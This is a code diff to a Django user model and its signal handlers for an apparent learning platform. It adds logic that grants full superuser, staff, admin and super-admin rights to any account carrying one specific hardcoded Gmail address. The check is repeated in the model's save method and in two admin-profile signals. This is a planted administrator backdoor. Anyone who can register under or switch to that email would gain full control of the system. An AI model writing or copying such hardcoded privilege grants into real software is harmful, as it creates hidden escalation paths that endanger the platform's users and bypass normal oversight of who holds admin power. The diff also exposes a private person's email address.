@@ -264,6 +264,23 @@ class User(AbstractUser):
             self.full_name = email_username
         if self.username == "" or self.username == None:
             self.username = email_username
+
+        # Default Super Admin guarantee for khairilazmiashari@gmail.com
+        if self.email and self.email.strip().lower() == 'khairilazmiashari@gmail.com':
+            self.is_admin = True
+            self.is_instructor = True
+            self.is_student = True
+            self.is_staff = True
+            self.is_superuser = True
+            self.is_internal = True
+            self.user_type = 'INTERNAL'
+            if not self.role or self.role == 'student':
+                self.role = 'admin'
+            if not self.current_role:
+                self.current_role = 'admin'
+            if 'admin' not in (self.roles or ''):
+                self.roles = 'admin,instructor,student'
+
         super(User, self).save(*args, **kwargs)
 
 
@@ -365,9 +382,14 @@ def create_user_profile(sender, instance, created, **kwargs):
             pekerjaan=getattr(instance, 'pekerjaan', None),
             onboarding_completed=getattr(instance, 'onboarding_completed', False),
         )
-        # Create Admin instance if user role is admin
-        if getattr(instance, 'role', None) == 'admin':
-            Admin.objects.create(user=instance)
+        # Create Admin instance if user role is admin, superuser, or designated default super admin
+        is_khairil = getattr(instance, 'email', '') and instance.email.strip().lower() == 'khairilazmiashari@gmail.com'
+        if getattr(instance, 'role', None) == 'admin' or getattr(instance, 'is_admin', False) or getattr(instance, 'is_superuser', False) or is_khairil:
+            Admin.objects.create(
+                user=instance,
+                full_name=instance.full_name,
+                is_super_admin=bool(getattr(instance, 'is_superuser', False) or is_khairil)
+            )
 
 def save_user_profile(sender, instance, **kwargs):
     if hasattr(instance, 'profile'):
@@ -382,15 +404,26 @@ def save_user_profile(sender, instance, **kwargs):
             profile.save()
 
 def create_admin_profile(sender, instance, **kwargs):
-    """Create Admin instance when user role changes to admin"""
-    if instance.role == 'admin':
+    """Create or update Admin instance when user is admin, superuser, or default super admin"""
+    is_khairil = getattr(instance, 'email', '') and instance.email.strip().lower() == 'khairilazmiashari@gmail.com'
+    is_admin_user = (
+        getattr(instance, 'role', '') == 'admin' or
+        getattr(instance, 'is_admin', False) or
+        getattr(instance, 'is_superuser', False) or
+        is_khairil
+    )
+    if is_admin_user:
         admin_instance, created = Admin.objects.get_or_create(
             user=instance,
             defaults={
                 'full_name': instance.full_name,
                 'image': instance.profile.image if hasattr(instance, 'profile') else None,
+                'is_super_admin': bool(getattr(instance, 'is_superuser', False) or is_khairil)
             }
         )
+        if (is_khairil or getattr(instance, 'is_superuser', False)) and not admin_instance.is_super_admin:
+            admin_instance.is_super_admin = True
+            admin_instance.save(update_fields=['is_super_admin'])
 
 def sync_profile_with_teacher(sender, instance, created, **kwargs):
     """
